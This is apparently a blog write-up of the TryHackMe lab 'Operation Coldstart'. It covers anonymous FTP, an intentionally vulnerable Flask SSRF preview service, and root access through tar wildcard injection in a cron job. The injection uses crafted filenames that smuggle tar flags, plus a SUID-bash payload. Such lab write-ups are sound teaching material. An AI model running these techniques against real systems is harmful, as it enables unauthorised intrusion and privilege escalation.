---
title: "Operation Coldstart"
date: 2026-10-31 18:17:37 +0700
categories: ["TryHackMe", "Challenge"]
tags: ["tryhackme", "web-security"]
toc: true
comments: false
---

![image-1202](/assets/img/obsidian/operation-coldstart/image-1202.png)

# Scenario

Volt Labs, a small SaaS shop, suspects an old staging server has rotted into an exposed liability. Mara has assigned you the engagement. Find your way in and demonstrate full compromise.

# Questions

![image-1203](/assets/img/obsidian/operation-coldstart/image-1203.png)

---

# Recon

`rustscan -a 10.48.168.62 -- -sV -sC`

![image-1204](/assets/img/obsidian/operation-coldstart/image-1204.png)

![image-1205](/assets/img/obsidian/operation-coldstart/image-1205.png)

Port 21 (FTP),22 (SSH) and 80 (HTTP) are opened. So, I will try with ftp protocol first. I try login as anonymous and it work

![image-1206](/assets/img/obsidian/operation-coldstart/image-1206.png)

And I found directory pub that contain `backup.tar.gz` file

![image-1207](/assets/img/obsidian/operation-coldstart/image-1207.png)

![image-1208](/assets/img/obsidian/operation-coldstart/image-1208.png)

![image-1209](/assets/img/obsidian/operation-coldstart/image-1209.png)
After extract file it contain `app.py`, which likely the source code for the site.

```python title:app.py
from flask import Flask, request, abort
from urllib.parse import urlparse
import html
import requests

app = Flask(__name__)

# Only requests targeting an approved internal hostname are forwarded.
# Internal hostname resolves to 127.0.0.1 via /etc/hosts on this box.
ALLOWED_HOSTS = {"kestrel.thm"}

CSS = """
<style>
:root{--primary:#0d6efd;--bg:#f6f8fa;--card:#fff;--text:#212529;--muted:#6c757d;--border:#dee2e6}
*{box-sizing:border-box}
body{margin:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;font-size:16px;line-height:1.5;color:var(--text);background:var(--bg)}
a{color:var(--primary);text-decoration:none}
a:hover{text-decoration:underline}
.navbar{background:#212529;color:#fff;padding:.75rem 1.5rem;display:flex;align-items:center;justify-content:space-between;box-shadow:0 1px 3px rgba(0,0,0,.08)}
.navbar .brand{font-weight:600;font-size:1.125rem;letter-spacing:.2px}
.navbar .muted-light{color:#a5acb3;font-size:.95rem}
.container{max-width:960px;margin:2rem auto;padding:0 1rem}
.card{background:var(--card);border:1px solid var(--border);border-radius:.5rem;padding:1.5rem;margin-bottom:1.25rem;box-shadow:0 1px 2px rgba(0,0,0,.04)}
h1{font-size:1.75rem;margin:0 0 .75rem}
h2{font-size:1.25rem;margin:1.25rem 0 .5rem}
.muted{color:var(--muted);font-size:.95rem}
.form-group{margin-bottom:1rem}
label{display:block;margin-bottom:.25rem;font-weight:500;font-size:.95rem}
.form-control{display:block;width:100%;padding:.5rem .75rem;font-size:1rem;line-height:1.5;color:var(--text);background:#fff;border:1px solid var(--border);border-radius:.375rem;transition:border-color .15s,box-shadow .15s}
.form-control:focus{outline:0;border-color:#86b7fe;box-shadow:0 0 0 .2rem rgba(13,110,253,.25)}
.btn{display:inline-block;padding:.5rem 1rem;font-size:1rem;font-weight:500;border:1px solid transparent;border-radius:.375rem;cursor:pointer;transition:background .15s}
.btn-primary{background:var(--primary);color:#fff}
.btn-primary:hover{background:#0b5ed7}
pre{background:#f1f3f5;border:1px solid var(--border);border-radius:.375rem;padding:.75rem;overflow:auto;font-size:.9rem;white-space:pre-wrap;word-break:break-word}
footer.site{text-align:center;color:var(--muted);margin:2rem 0;font-size:.875rem}
</style>
"""

def page(title, body):
    return f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>{title} - Volt Labs</title>{CSS}</head>
<body>
<nav class="navbar">
    <span class="brand">Volt Labs</span>
    <span class="muted-light">URL Preview Service &middot; staging</span>
</nav>
<main class="container">{body}</main>
<footer class="site">&copy; Volt Labs &middot; do not expose externally</footer>
</body>
</html>"""

@app.route("/")
def index():
    body = """
    <div class="card">
        <h1>URL Preview Service</h1>
        <p class="muted">Internal tool. Paste a URL below to preview its contents.</p>
        <form method="get" action="/preview">
            <div class="form-group">
                <label for="url">URL</label>
                <input id="url" type="text" name="url" class="form-control" placeholder="https://example.com/" required>
            </div>
            <button type="submit" class="btn btn-primary">Preview</button>
        </form>
    </div>
    """
    return page("URL Preview", body)

@app.route("/preview")
def preview():
    target = request.args.get("url", "")
    if not target:
        return page("Preview Error",
                    '<div class="card"><p>Provide a <code>?url=</code> parameter.</p></div>'), 400

    # VULN: hostname allow-list is the only check. No scheme check, no path check,
    # no localhost-rebind protection - the SSRF is still abusable, but only
    # against the allowed hostname.
    host = (urlparse(target).hostname or "").lower()
    if host not in ALLOWED_HOSTS:
        return page("Preview Blocked",
                    '<div class="card"><p>Host not in the approved internal allow-list.</p></div>'), 403

    try:
        r = requests.get(target, timeout=3)
        safe_target = html.escape(target)
        safe_body = r.text.replace("<", "&lt;")
        body = f"""
        <div class="card">
            <h2>Preview of {safe_target}</h2>
            <pre>{safe_body}</pre>
        </div>
        """
        return page("Preview", body)
    except Exception as e:
        safe_err = html.escape(str(e))
        return page("Preview Failed",
                    f'<div class="card"><p>Fetch failed: {safe_err}</p></div>'), 502

@app.route("/admin/")
@app.route("/admin/<path:p>")
def admin(p="index"):
    if not request.remote_addr.startswith("127."):
        abort(403)
    if p == "notes":
        with open("/opt/voltlabs-preview/admin_notes.txt") as f:
            return "<pre>" + f.read() + "</pre>"
    return "<pre>Volt Labs admin endpoint.</pre>"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=80)

```


The site is a flask-based "URL Preview Service" for Volt Labs that fetches a user-supplied URL and renders its contents on the page, gated by a hostname allow-list `kestrel.thm`. It also exposes an `/admin/` area restricted to loopback clients, including an `/admin/notes` endpoint that reads `admin_notes.txt` from disk

From the comments, we can see that `kestrel.thm` resolves to `127.0.0.1` in the internal `/etc/hosts` file. And the admin endpoint is only accessible internally.


# Website

Now, let enumerate the website.

![image-1210](/assets/img/obsidian/operation-coldstart/image-1210.png)

Since we already know website source code. I will try to put
http://kestrel.thm which resolve to `127.0.0.1`

![image-1213](/assets/img/obsidian/operation-coldstart/image-1213.png)
![image-1214](/assets/img/obsidian/operation-coldstart/image-1214.png)

and in the source code we can access to `admin_note.txt `via `/admin/note`

![image-1215](/assets/img/obsidian/operation-coldstart/image-1215.png)

And we got the SSH access credential.

![image-1216](/assets/img/obsidian/operation-coldstart/image-1216.png)

![image-1217](/assets/img/obsidian/operation-coldstart/image-1217.png)

![image-1218](/assets/img/obsidian/operation-coldstart/image-1218.png)

and got the first flag!

# Privilege escalation (root)

I continue enumerate the targets to find vuln for **privilege escalation** and I found something interesting at `/etc/cron.d/*`

![image-1219](/assets/img/obsidian/operation-coldstart/image-1219.png)

`* * * * * root cd /opt/backups && tar czf /var/backups/uploads.tgz *
`
This seem to vuln with **wildcard injection attack** or **argument injection**

When root's cron runs `tar czf out.tgz *` in a directory you can write to, the shell expands `*` to whatever filenames exist there. So files named `--checkpoint=1` and `--checkpoint-action=exec=sh shell.sh` get passed to tar as actual command-line flags. Tar's `--checkpoint-action=exec=` runs a shell command at each checkpoint, so it executes `shell.sh` as `root`.

```bash
# payload: copy bash, set SUID bit
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > shell.sh

# filenames that become tar flags after shell expansion
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh shell.sh"
```

Once root runs e.g. `tar -czf /root/backup.tgz *`, `shell.sh` is executed as `root`.

![image-1220](/assets/img/obsidian/operation-coldstart/image-1220.png)

and we will find flag at `/root/flag.txt`

![image-1221](/assets/img/obsidian/operation-coldstart/image-1221.png)

*DONE !!!*

---
